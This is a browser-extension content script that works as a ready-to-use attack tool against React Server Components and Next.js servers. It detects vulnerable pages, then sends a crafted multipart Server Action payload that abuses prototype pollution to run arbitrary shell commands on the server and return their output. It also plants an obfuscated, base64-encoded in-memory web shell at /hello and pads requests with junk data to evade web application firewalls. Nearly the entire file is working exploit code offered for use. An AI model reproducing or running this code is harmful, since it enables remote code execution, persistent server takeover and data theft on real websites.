function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }
    return { isRSC: score >= 50, details: details };
}

async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });
        
        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) details.push("Response Content-Type became text/x-component");
        if (vary.includes('RSC')) details.push("Vary header contains 'RSC'");
        if (/^\d+:["IHL]/.test(text)) details.push("Body structure matches React Flight Protocol");

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error"] };
    }
}

function generateJunkData(sizeBytes) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let paramName = '';
    let junk = '';
    
    for (let i = 0; i < 12; i++) {
        paramName += 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)];
    }
    
    for (let i = 0; i < sizeBytes; i++) {
        junk += chars[Math.floor(Math.random() * chars.length)];
    }
    
    return { paramName, junk };
}

async function deployMemoryShell(wafEnabled) {
    try {
        const currentPath = window.location.pathname || '/en';
        const targetUrl = new URL(currentPath, window.location.href).href;
        
        const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
        
        const shouldAddJunkData = wafEnabled === true && typeof wafEnabled === 'boolean';
        console.log('[Memory Shell] Received wafEnabled:', wafEnabled, 'Type:', typeof wafEnabled);
        console.log('[Memory Shell] Will add junk data:', shouldAddJunkData);
        
        const memoryShellCode = `(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const o=http.Server.prototype.emit;http.Server.prototype.emit=function(e,...a){if(e==='request'){const[r,s]=a;const p=url.parse(r.url,true);if(p.pathname==='/hello'){const cmd=p.query.cmd||'';let html='<!DOCTYPE html><html><head><meta charset="UTF-8"><title>WebShell</title><style>body{font-family:monospace;background:#1e1e1e;color:#d4d4d4;padding:20px;max-width:1200px;margin:0 auto;}h1{color:#4ec9b0;border-bottom:2px solid #4ec9b0;padding-bottom:10px;}form{margin:20px 0;background:#252526;padding:15px;border-radius:5px;}input[type="text"]{width:70%;padding:8px;background:#3c3c3c;border:1px solid #555;color:#d4d4d4;font-size:14px;}input[type="submit"]{width:25%;padding:8px;background:#0e639c;border:none;color:#fff;cursor:pointer;font-size:14px;margin-left:10px;}input[type="submit"]:hover{background:#1177bb;}pre{background:#252526;padding:15px;border-radius:5px;overflow-x:auto;border:1px solid #555;white-space:pre-wrap;word-wrap:break-word;}a{color:#4ec9b0;text-decoration:none;}a:hover{text-decoration:underline;}.info{background:#252526;padding:10px;border-radius:5px;margin-top:20px;font-size:12px;color:#858585;border-left:3px solid #4ec9b0;}code{color:#4ec9b0;background:#1e1e1e;padding:2px 6px;border-radius:3px;}</style></head><body><h1>WebShell</h1><form method="GET" action="/hello"><input type="text" name="cmd" value="'+(cmd?cmd.replace(/"/g,'&quot;').replace(/'/g,'&#39;'):'')+'" placeholder="Enter command (e.g., ls -la, cd /home && ls)"><input type="submit" value="Execute"></form>';let currentDir='';if(cmd){try{const result=cp.execSync(cmd,{encoding:'utf8',stdio:'pipe',shell:true});html+='<h2>Output:</h2><pre>'+result.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}catch(err){html+='<h2>Error:</h2><pre style="color:#f48771;">'+err.message.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}try{currentDir=cp.execSync('pwd',{encoding:'utf8',stdio:'pipe',shell:true}).trim();}catch(e){currentDir=process.cwd();}}else{currentDir=process.cwd();}html+='<div class="info"><a href="/hello">Clear</a> | <strong>Current Directory:</strong> <code>'+currentDir.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</code></div></body></html>';s.writeHead(200,{'Content-Type':'text/html;charset=utf-8'});s.end(html);return true;}}return o.apply(this,arguments);};})();`;
        
        const memoryShellBase64 = btoa(unescape(encodeURIComponent(memoryShellCode)));
        
        const prefixPayload = `var shellCode=Buffer.from('${memoryShellBase64}','base64').toString('utf8');eval(shellCode);var res='Memory shell deployed at /hello';throw Object.assign(new Error('x'),{digest: Buffer.from(res).toString('base64')});`;
        
        const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
        
        const parts = [];
        
        if (shouldAddJunkData) {
            const wafBypassSizeKb = 128;
            const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
            parts.push(
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
                `${junk}\r\n`
            );
        }
        
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="0"\r\n\r\n` +
            `${part0}\r\n`
        );
        
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="1"\r\n\r\n` +
            `"$@0"\r\n`
        );
        
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="2"\r\n\r\n` +
            `[]\r\n`
        );
        
        parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
        
        const bodyParts = parts.join('');
        
        console.log('[Content] Deploying memory shell to:', targetUrl);
        
        const makeRequest = (url) => {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                
                xhr.setRequestHeader('Accept', '*/*');
                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                
                xhr.setRequestHeader('Next-Action', 'x');
                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                
                xhr.onload = () => {
                    resolve({
                        status: xhr.status,
                        statusText: xhr.statusText,
                        responseText: xhr.responseText,
                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
                        getResponseHeader: (name) => xhr.getResponseHeader(name)
                    });
                };
                
                xhr.onerror = () => {
                    reject(new Error('Network request failed'));
                };
                
                xhr.send(bodyParts);
            });
        };
        
        let res = await makeRequest(targetUrl);
        const statusCode = res.status;
        const responseText = res.responseText || '';
        
        console.log('[Content] Memory shell response status:', statusCode);
        console.log('[Content] Memory shell response text length:', responseText.length);
        console.log('[Content] Memory shell response text:', responseText);
        
        let digestMatch = responseText.match(/"digest"\s*:\s*"([^"]+)"/);
        if (!digestMatch) {
            digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
        }
        
        if (digestMatch && digestMatch[1]) {
            try {
                let rawBase64 = digestMatch[1];
                console.log('[Content] Raw digest base64:', rawBase64);
                
                let cleanBase64 = rawBase64;
                try {
                    cleanBase64 = JSON.parse(`"${rawBase64}"`);
                } catch (e) {
                    cleanBase64 = rawBase64;
                }
                
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );
                
                console.log('[Content] Memory shell deployment response (decoded):', decodedStr);
                
                const shellPath = '/hello';
                const shellUrl = new URL(shellPath, window.location.origin).href;
                
                return {
                    success: true,
                    shellPath: shellPath,
                    fullUrl: shellUrl,
                    statusCode: statusCode,
                    message: decodedStr
                };
            } catch (parseError) {
                console.log('[Content] Failed to parse digest:', parseError);
                console.log('[Content] Error details:', parseError.message);
                console.log('[Content] Raw digest value:', digestMatch[1]);
            }
        } else {
            console.log('[Content] No digest found in response');
        }
        
        if (statusCode >= 200 && statusCode < 300) {
            const shellPath = '/hello';
            const shellUrl = new URL(shellPath, window.location.origin).href;
            
            return {
                success: true,
                shellPath: shellPath,
                fullUrl: shellUrl,
                statusCode: statusCode
            };
        } else if (statusCode === 500) {
            const shellPath = '/hello';
            const shellUrl = new URL(shellPath, window.location.origin).href;
            
            return {
                success: true,
                shellPath: shellPath,
                fullUrl: shellUrl,
                statusCode: statusCode,
                note: 'Deployed (500 error may indicate payload execution)'
            };
        } else {
            return {
                success: false,
                msg: `Memory shell deployment failed. Status: ${statusCode}. Response: ${responseText.substring(0, 200)}`,
                statusCode: statusCode
            };
        }
        
    } catch (e) {
        console.log('[Content] Memory shell deployment error:', e);
        return {
            success: false,
            msg: "Network/Request Error: " + e.message
        };
    }
}

async function performExploit(cmd, wafEnabled) {
    const targetCmd = cmd || "echo vulnerability_test";
    
    const shouldAddJunkData = wafEnabled === true && typeof wafEnabled === 'boolean';
    console.log('[RSC Exploit] Received wafEnabled:', wafEnabled, 'Type:', typeof wafEnabled);
    console.log('[RSC Exploit] Will add junk data:', shouldAddJunkData);
    
    const prefixPayload = `var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});`;
    
    const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
    
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    
    const parts = [];
    
    if (shouldAddJunkData) {
        const wafBypassSizeKb = 128;
        const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
            `${junk}\r\n`
        );
    }
    
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `${part0}\r\n`
    );
    
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `"$@0"\r\n`
    );
    
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="2"\r\n\r\n` +
        `[]\r\n`
    );
    
    parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
    
    const bodyParts = parts.join('');

    let targetUrl = new URL("/adfa", window.location.href).href;

    lastRequestData = {
        url: targetUrl,
        boundary: boundary,
        body: bodyParts,
        bodyLength: bodyParts.length
    };

    let statusCode = null;
    let pageTitle = '-';
    let responseText = '';
    
    try {
        console.log('[Content] Sending exploit request to:', targetUrl);
        
        const makeRequest = (url) => {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                
                xhr.setRequestHeader('Accept', '*/*');
                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                
                xhr.setRequestHeader('Next-Action', 'x');
                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                
                xhr.onload = () => {
                    resolve({
                        status: xhr.status,
                        statusText: xhr.statusText,
                        responseText: xhr.responseText,
                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
                        getResponseHeader: (name) => xhr.getResponseHeader(name)
                    });
                };
                
                xhr.onerror = () => {
                    reject(new Error('Network request failed'));
                };
                
                xhr.send(bodyParts);
            });
        };
        
        let res = await makeRequest(targetUrl);
        statusCode = res.status;
        console.log('[Content] Initial response status:', statusCode);
        
        if (statusCode >= 300 && statusCode < 400) {
            const locationHeader = res.getResponseHeader('Location') || res.getResponseHeader('location');
            if (locationHeader) {
                const redirectUrl = new URL(locationHeader, targetUrl).href;
                console.log('[Content] Redirect detected to:', redirectUrl);
                
                targetUrl = redirectUrl;
                lastRequestData.url = targetUrl;
                res = await makeRequest(targetUrl);
                statusCode = res.status;
                console.log('[Content] Retry on redirect URL, new status:', statusCode);
            }
        }
        
        responseText = res.responseText || '';
        console.log('[Content] Response text length:', responseText.length);
        
        try {
            if (responseText) {
                const titleMatch = responseText.match(/<title[^>]*>([^<]+)<\/title>/i);
                if (titleMatch && titleMatch[1]) {
                    pageTitle = titleMatch[1].trim();
                }
            }
            if (pageTitle === '-' && typeof document !== 'undefined' && document.title) {
                pageTitle = document.title;
            }
        } catch (e) {
            console.log('[Content] Title extraction error:', e);
        }
        
        console.log('[Content] Extracted title:', pageTitle);

        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];
            
            try {
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );

                const result = { 
                    success: true, 
                    output: decodedStr,
                    statusCode: statusCode,
                    title: pageTitle,
                    requestData: lastRequestData
                };
                console.log('[Content] Returning success result:', result);
                return result;
            } catch (parseError) {
                return { 
                    success: false, 
                    msg: "Decoding Error: " + parseError.message, 
                    debug: rawBase64,
                    statusCode: statusCode,
                    title: pageTitle,
                    requestData: lastRequestData
                };
            }
        } else {
            return { 
                success: false, 
                msg: "Exploit Failed: 'digest' key not found.",
                debug: responseText ? responseText.substring(0, 100) : 'No response text',
                statusCode: statusCode,
                title: pageTitle,
                requestData: lastRequestData
            };
        }

    } catch (e) {
        console.log('[Content] Fetch error:', e);
        return { 
            success: false, 
            msg: "Network/Request Error: " + e.message,
            statusCode: statusCode || null,
            title: pageTitle || '-',
            requestData: lastRequestData
        };
    }
}

const browserAPI = typeof browser !== 'undefined' ? browser : chrome;

let lastRequestData = null;

const passiveData = performPassiveScan();
if(passiveData.isRSC) browserAPI.runtime.sendMessage({ action: "update_badge" });

browserAPI.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") sendResponse(passiveData);
    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }
    if (req.action === "run_exploit") {
        console.log('[Content] Received message - wafEnabled:', req.wafEnabled, 'Type:', typeof req.wafEnabled);
        performExploit(req.cmd, req.wafEnabled).then(res => {
            sendResponse(res);
        });
        return true;
    }
    if (req.action === "get_last_request") {
        sendResponse(lastRequestData);
        return false;
    }
    if (req.action === "deploy_memory_shell") {
        console.log('[Content] Received memory shell message - wafEnabled:', req.wafEnabled, 'Type:', typeof req.wafEnabled);
        deployMemoryShell(req.wafEnabled).then(res => {
            sendResponse(res);
        });
        return true;
    }
});
